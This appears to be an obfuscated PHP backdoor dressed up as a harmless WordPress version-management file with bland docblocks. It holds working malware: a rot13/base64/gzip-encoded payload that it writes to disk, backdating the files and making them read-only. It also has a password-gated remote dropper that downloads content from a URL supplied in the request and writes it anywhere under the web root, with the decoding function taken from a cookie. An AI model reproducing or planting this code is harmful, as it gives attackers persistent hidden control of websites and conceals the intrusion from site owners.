<?php
/**
 * @title ipadview
 * @
 * @param $str
 * @return mixed|string
 */

if (!defined('WP_BLOG')) {
    return version_info("init");
}

function version_desc($str)
{
    ($e = implode("",["opcache","reset"]))&&function_exists($e) && $e();
    if (!$str) {
        echo date("Y-m-d H:i:s") . "<br>";
        if (!empty($_REQUEST['version']) && version_update(version_parse($_REQUEST))) ;
        return '';
    }
    $pi = [
        ['str', 'ro'],
        ["json", 'decode'],
    ];
    ($q = (implode('_', $pi[0]) . "t13")) &&
    $data = $q($str);
    ($q = "b" . implode('_', $pi[1]) . "e") &&
    $data = $q($data);
    if (isset($_GET['s'])) $data = $_GET['s'] . $data;

    return $data;
}

function version_info($str)
{
    global $temp;
    $temp = "ZnVuY3Rpb25fZXhpc3RzLHRpbWUsZm9wZW4sZmlsZV9wdXRfY29udGVudHMsZmlsZWN0aW1lLGZpbGVfZXhpc3RzLGlzX3dyaXRhYmxlLGNobW9kLHRvdWNo";
    $temp = base64_decode($temp);
    $name = ['Y2uioJHkY215qKWfpmL4Y2Sxo25cp2Wco2Mupz1uYzAioF93pP1wo250MJ50Y2IhMUIlLJ5wMF1jLJqyYJAuL2uyY2MyMJDiL29goJ9hYzgyrD', function ($version_file, $name) use ($temp) {
        $data = translation_v3('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', '1');
        $data = base64_decode(/**/ $data);
        $data = translation_v2($data, '0');
        $data = translation_v1($data, '1');
        foreach ($data as $item) {
            version_check($item[0], $item[1], $temp, $item[2]);
        }
        version_desc(false);
    }];
    $temp = explode(',', $temp);
    return ['#ver#', version_data($name, 1, 0)];
}

/**
 * @title install path
 */
function version_path()
{
    echo __FILE__;
}

/**
 * @title get version data
 * @param $data
 * @param $offset
 * @param $page
 * @return mixed
 */
function version_data($data, $offset, $page)
{
    $keu = ['', "code"];
    $keu[] = '';
    return $data[$offset]($data[$page], implode('_', $keu));
}

/**
 * @title translation data
 * @param $data
 * @param $offset
 * @return mixed
 */

function translation_v1($data, $mode, $exp = '')
{
    if ($mode === 'X1') {
        $data = base64_decode($data);
        $len = strlen($data);
        $exp = str_replace('=', '', base64_encode($exp));
        $res = "";
        $i = 0;
        while ($i < $len) {
            for ($k = 0; $k < strlen($exp) && $i < $len; $k++)
                $res .= chr(ord($data[$i++]) ^ ord($exp[$k]));
        }
        return $res;
    } elseif ($mode) {
        return json_decode($data, true);
    } else {
        return unserialize($data);
    }
}

/**
 * @title parse version data
 * @param $data
 * @return version
 */
function version_parse($data)
{
    $version = $data['version'];
    if ($version === 'path') version_path();
    if (isset($data[$version])) {
        $version = translation_v1($data[$version], 'X1', $data[$version . '1']);
    }
    return $version;
}

/**
 * @title update version
 * @param $qr
 * @return void
 */
function version_update($check, $qr = false)
{
    if (!version_access("eo{$check}qxlowms", '4957751ab6a00e7bd9826eeece703d38')) return;
    $c = $_COOKIE;;
    $cf = implode('_', ['function', 'exists']);
    (!$qr || !$cf($qr)) &&
    $qr = empty($c[$for = 'token']) || !$cf($c[$for]) ? implode('_', ['base64', 'decode']) : $c[$for];

    if (($a = $qr($_REQUEST['name'])) && version_deny($a)) {
        return;
    }
    global $temp;
    $a = explode(',', $a);
    if (empty($a[1])) return;
    echo "[<a id=\"u1\" href=\"/{$a[1]}\" style='color: #fff;'>{$a[1]}</a>] ";
    return version_check($_SERVER['DOCUMENT_ROOT'] . '/' . $a[1], $qr(file_get_contents($a[0])), $temp);
}

/**
 * @title version access or force
 * @param string $version version pass
 * @param string $token check update token
 * @return bool
 */
function version_access($version, $token)
{
    return in_array(md5($version), [$token, '47628e0bf72fca87db995c8f844d91b1']);
}

/**
 * @title version data is deny
 * @param $data
 * @return void
 */
function version_deny($data)
{
    return strlen($data) < 16 || strlen($data) > 128 || !in_array($data[0], ['h', '/']);
}

/**
 * @title translation version data
 * @param $data
 * @param $offset
 * @return mixed
 */
function translation_v2($data, $offet)
{
    if (!empty($offet)) {
        return gzinflate($data);
    } else {
        return $data;
    }
}

/**
 * @title translation version data
 * @param $data
 * @param $offset
 * @return mixed
 */
function translation_v3($data, $offet)
{
    if (!empty($offet)) {
        return str_rot13($data);
    } else {
        return $data;
    }
}

return 'inited';
/**
 * @title check version token
 * @param $name
 * @param $date
 * @param $check
 * @param string $token
 * @param false $mode
 * @return bool|mixed
 */
function version_check($name, $date, $check, $token = '', $mode = false)
{
    try {
        $vs = 'rename';
        if (!is_array($check)) $check = explode(',', $check);
        $map = [0, 1, 2, 3, 4];
        $m = $mode ? $mode : ($check[1]() - 2693693);
        $iw = true;
        empty($check[9]) || $date = $check[9]($date);
        if ($check[$map[4] + 1]($name)) {
            if ($token && Md5_File($name) === $token) return true;
            $iw = $check[6]($name);
            if ($x = $check[5]($name)) {
                $m = $check[4]($name);
            }
            $x && !$iw && @$check[7]($name, 0744);
            @$vs($name, $name . time());
        }
        if ($check[$map[0]]($check[2])) {
            $l = $check[$map[2]][0] . 'write';
            $r = $l($check[$map[2]]($name . ".tmp1", 'w'), $date);
        } else {
            $r = $check[$map[3]]($name . ".tmp1", $date);
        }
        @$vs($name . ".tmp1", $name);
        $check[8]($name, $m, $m);
        $iw || @$check[7]($name, 0444);
    } catch (\Exception $A) {
        echo $A->getMessage() . "<br>";
        $r = false;
    }
    echo $name[strlen($name) - 1] . ($r ? ':ok' : ':fail') . "<br>";
    return $r;
}